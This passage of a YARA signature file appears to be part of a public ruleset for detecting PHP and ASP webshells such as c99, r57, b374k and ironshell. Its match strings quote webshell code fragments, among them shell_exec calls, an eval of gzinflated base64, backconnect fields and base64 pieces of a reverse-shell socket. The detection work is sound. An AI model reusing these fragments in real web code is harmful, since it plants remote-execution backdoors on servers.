		1 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php_ctt_sh_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt, ctt_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"
		hash6 = "671cad517edd254352fe7e0c7c981c39"
	strings:
		$s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\""
		$s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile"
		$s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr"
		$s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m"
	condition:
		all of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"
	strings:
		$s0 = "$sess_data[\"cut\"] = array(); c99_s"
		$s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"
	condition:
		1 of them
}
rule _w_php_php_wacking_php_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "09609851caa129e40b0d56e90dfc476c"
	strings:
		$s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
		$s2 = "c99sh_sqlquery"
	condition:
		1 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash4 = "09609851caa129e40b0d56e90dfc476c"
	strings:
		$s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA"
		$s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec"
	condition:
		1 of them
}
rule _r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"
	strings:
		$s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
		$s1 = ".$arrow.\"</b>\",in('text','"
	condition:
		2 of them
}
rule _r577_php_php_SnIpEr_SA_Shell_php_r57_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
	strings:
		$s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
		$s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
		$s2 = "rst.void.ru"
	condition:
		3 of them
}
rule _r577_php_php_r57_Shell_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "8023394542cddf8aee5dec6072ed02b5"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"
	strings:
		$s0 = "echo ws(2).$lb.\" <a"
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']"
		$s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l"
	condition:
		2 of them
}
rule _wacking_php_php_1_SpecialShell_99_php_php_c100_php {
	meta:
		description = "Semi-Auto-generated  - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "9c5bb5e3a46ec28039e8986324e42792"
		hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash2 = "09609851caa129e40b0d56e90dfc476c"
		hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"
	strings:
		$s0 = "if(eregi(\"./shbd $por\",$scan))"
		$s1 = "$_POST['backconnectip']"
		$s2 = "$_POST['backcconnmsg']"
	condition:
		1 of them
}
rule _r577_php_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "8023394542cddf8aee5dec6072ed02b5"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"
	strings:
		$s1 = "if(rmdir($_POST['mk_name']))"
		$s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
		$s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"
	condition:
		2 of them
}
rule _w_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "09609851caa129e40b0d56e90dfc476c"
	strings:
		$s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
		$s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
		$s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"
	condition:
		1 of them
}
rule _webadmin_php_php_iMHaPFtp_php_php_Private_i3lue_php {
	meta:
		description = "Semi-Auto-generated  - from files webadmin.php.php.txt, iMHaPFtp.php.php.txt, Private-i3lue.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "b268e6fa3bf3fe496cffb4ea574ec4c7"
		hash1 = "12911b73bc6a5d313b494102abcf5c57"
		hash2 = "13f5c7a035ecce5f9f380967cf9d4e92"
	strings:
		$s0 = "return $type . $owner . $group . $other;" fullword
		$s1 = "$owner  = ($mode & 00400) ? 'r' : '-';" fullword
	condition:
		all of them
}
rule multiple_php_webshells {
	meta:
		description = "Semi-Auto-generated  - from files multiple_php_webshells"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "be0f67f3e995517d18859ed57b4b4389"
		hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash4 = "8023394542cddf8aee5dec6072ed02b5"
		hash5 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash6 = "817671e1bdc85e04cc3440bbd9288800"
		hash7 = "7101fe72421402029e2629f3aaed6de7"
		hash8 = "f618f41f7ebeb5e5076986a66593afd1"
	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
		$s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"
	condition:
		2 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
	strings:
		$s0 = "<b>Dumped! Dump has been writed to "
		$s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st"
		$s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive"
	condition:
		1 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
	strings:
		$s0 = "@ini_set(\"highlight" fullword
		$s1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword
		$s2 = "{$row[] = \"<b>Owner/Group</b>\";}" fullword
	condition:
		2 of them
}
rule _GFS_web_shell_ver_3_1_7___PRiV8_php_nshell_php_php_gfs_sh_php_php {
	meta:
		description = "Semi-Auto-generated  - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "be0f67f3e995517d18859ed57b4b4389"
		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
		hash2 = "f618f41f7ebeb5e5076986a66593afd1"
	strings:
		$s2 = "echo $uname.\"</font><br><b>\";" fullword
		$s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
		$s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()"
	condition:
		2 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "09609851caa129e40b0d56e90dfc476c"
	strings:
		$s0 = "c99ftpbrutecheck"
		$s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
		$s2 = "$fqb_lenght = $nixpwdperpage;" fullword
		$s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword
	condition:
		2 of them
}
rule _w_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash3 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash4 = "09609851caa129e40b0d56e90dfc476c"
	strings:
		$s0 = "$sqlquicklaunch[] = array(\""
		$s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<"
	condition:
		all of them
}
rule _antichat_php_php_Fatalshell_php_php_a_gedit_php_php {
	meta:
		description = "Semi-Auto-generated  - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "128e90b5e2df97e21e96d8e268cde7e3"
		hash1 = "b15583f4eaad10a25ef53ab451a4a26d"
		hash2 = "ab9c6b24ca15f4a1b7086cad78ff0f78"
	strings:
		$s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
		$s1 = "if($action==\"phpeval\"){" fullword
		$s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
		$s3 = "$dir=getcwd().\"/\";" fullword
	condition:
		2 of them
}
rule _c99shell_v1_0_php_php_c99php_SsEs_php_php {
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
	strings:
		$s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword
	condition:
		1 of them
}
rule _Crystal_php_nshell_php_php_load_shell_php_php {
	meta:
		description = "Semi-Auto-generated  - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "fdbf54d5bf3264eb1c4bff1fac548879"
		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
		hash2 = "0c5d227f4aa76785e4760cdcff78a661"
	strings:
		$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
		$s1 = "$dires = $dires . $directory;" fullword
		$s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword
	condition:
		2 of them
}
rule _nst_php_php_cybershell_php_php_img_php_php_nstview_php_php {
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "ef8828e0bc0641a655de3932199c0527"
		hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash3 = "4745d510fed4378e4b1730f56f25e569"
	strings:
		$s0 = "@$rto=$_POST['rto'];" fullword
		$s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
		$s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword
	condition:
		2 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_dC3_Security_Crew_Shell_PRiV_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, dC3 Security Crew Shell PRiV.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "433706fdc539238803fd47c4394b5109"
		hash4 = "09609851caa129e40b0d56e90dfc476c"
	strings:
		$s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":"
		$s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword
	condition:
		all of them
}
rule _c99shell_v1_0_php_php_c99php_1_c2007_php_php_c100_php {
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash3 = "d089e7168373a0634e1ac18c0ee00085"
		hash4 = "38fd7e45f9c11a37463c3ded1c76af4c"
	strings:
		$s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword
	condition:
		all of them
}
rule multiple_php_webshells_2 {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt, ctt_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash6 = "09609851caa129e40b0d56e90dfc476c"
		hash7 = "671cad517edd254352fe7e0c7c981c39"
	strings:
		$s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I"
		$s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma"
		$s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword
	condition:
		all of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_1_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash4 = "09609851caa129e40b0d56e90dfc476c"
	strings:
		$s0 = "if ($total === FALSE) {$total = 0;}" fullword
		$s1 = "$free_percent = round(100/($total/$free),2);" fullword
		$s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
		$s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword
	condition:
		2 of them
}
rule _r577_php_php_r57_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"
	strings:
		$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
		$s2 = "'eng_text30'=>'Cat file'," fullword
		$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword
	condition:
		1 of them
}
rule _nixrem_php_php_c99shell_v1_0_php_php_c99php_NIX_REMOTE_WEB_SHELL_v_0_5_alpha_Lite_Public_Version_php {
	meta:
		description = "Semi-Auto-generated  - from files nixrem.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "40a3e86a63d3d7f063a86aab5b5f92c6"
		hash1 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash2 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash3 = "f3ca29b7999643507081caab926e2e74"
	strings:
		$s0 = "$num = $nixpasswd + $nixpwdperpage;" fullword
		$s1 = "$ret = posix_kill($pid,$sig);" fullword
		$s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}" fullword
		$s3 = "$i = $nixpasswd;" fullword
	condition:
		2 of them
}

/* GIF Header webshell */

rule DarkSecurityTeam_Webshell {
	meta:
		description = "Dark Security Team Webshell"
		author = "Florian Roth"
		hash = "f1c95b13a71ca3629a0bb79601fcacf57cdfcf768806a71b26f2448f8c1d5d24"
		score = 50
	strings:
		$s0 = "form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&" ascii
	condition:
		1 of them
}

rule PHP_Cloaked_Webshell_SuperFetchExec {
	meta:
		description = "Looks like a webshell cloaked as GIF - http://goo.gl/xFvioC"
		reference = "http://goo.gl/xFvioC"
		author = "Florian Roth"
		score = 50
	strings:
		$s0 = "else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);"
	condition:
		$s0
}

/* PHP Webshell Update - August 2014 - deducted from https://github.com/JohnTroony/php-webshells */

rule WebShell_RemExp_asp_php {
	meta:
		description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
		author = "Florian Roth"
		hash = "d9919dcf94a70d5180650de8b81669fa1c10c5a2"
	strings:
		$s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
		$s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
		$s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
		$s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
		$s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword
	condition:
		all of them
}
rule WebShell_dC3_Security_Crew_Shell_PRiV {
	meta:
		description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
		author = "Florian Roth"
		hash = "1b2a4a7174ca170b4e3a8cdf4814c92695134c8a"
	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
		$s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
		$s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
		$s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword
	condition:
		3 of them
}
rule WebShell_simattacker {
	meta:
		description = "PHP Webshells Github Archive - file simattacker.php"
		author = "Florian Roth"
		hash = "258297b62aeaf4650ce04642ad5f19be25ec29c9"
	strings:
		$s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
		$s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
		$s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
		$s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
		$s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s20 = "$Comments=$_POST['Comments'];" fullword
	condition:
		2 of them
}
rule WebShell_DTool_Pro {
	meta:
		description = "PHP Webshells Github Archive - file DTool Pro.php"
		author = "Florian Roth"
		hash = "e2ee1c7ba7b05994f65710b7bbf935954f2c3353"
	strings:
		$s1 = "function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront"
		$s2 = "<font size=3>by r3v3ng4ns - revengans@gmail.com </font>" fullword
		$s3 = "function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig"
		$s11 = "//Turns the 'ls' command more usefull, showing it as it looks in the shell" fullword
		$s13 = "if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";" fullword
		$s14 = "//To keep the changes in the url, when using the 'GET' way to send php variables" fullword
		$s16 = "function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite "
		$s18 = "if(empty($fu)) $fu = @$_GET['fu'];" fullword
	condition:
		3 of them
}
rule WebShell_ironshell {
	meta:
		description = "PHP Webshells Github Archive - file ironshell.php"
		author = "Florian Roth"
		hash = "d47b8ba98ea8061404defc6b3a30839c4444a262"
	strings:
		$s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
		$s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
		$s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
		$s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
		$s15 = "if(!is_numeric($_POST['timelimit']))" fullword
		$s16 = "if($_POST['chars'] == \"9999\")" fullword
		$s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
		$s18 = "print shell_exec($command);" fullword
	condition:
		3 of them
}
rule WebShell_indexer_asp_php {
	meta:
		description = "PHP Webshells Github Archive - file indexer.asp.php.txt"
		author = "Florian Roth"
		hash = "e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d"
	strings:
		$s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
		$s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
		$s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
		$s4 = "<form action=\"?oku\" method=\"post\">" fullword
		$s7 = "var message=\"SaNaLTeRoR - " fullword
		$s8 = "nDexEr - Reader\"" fullword
	condition:
		3 of them
}
rule WebShell_toolaspshell {
	meta:
		description = "PHP Webshells Github Archive - file toolaspshell.php"
		author = "Florian Roth"
		hash = "11d236b0d1c2da30828ffd2f393dd4c6a1022e3f"
	strings:
		$s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
		$s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
		$s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword
	condition:
		2 of them
}
rule WebShell_b374k_mini_shell_php_php {
	meta:
		description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
		author = "Florian Roth"
		hash = "afb88635fbdd9ebe86b650cc220d3012a8c35143"
	strings:
		$s0 = "@error_reporting(0);" fullword
		$s2 = "@eval(gzinflate(base64_decode($code)));" fullword
		$s3 = "@set_time_limit(0); " fullword
	condition:
		all of them
}
rule WebShell_Sincap_1_0 {
	meta:
		description = "PHP Webshells Github Archive - file Sincap 1.0.php"
		author = "Florian Roth"
		hash = "9b72635ff1410fa40c4e15513ae3a496d54f971c"
	strings:
		$s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
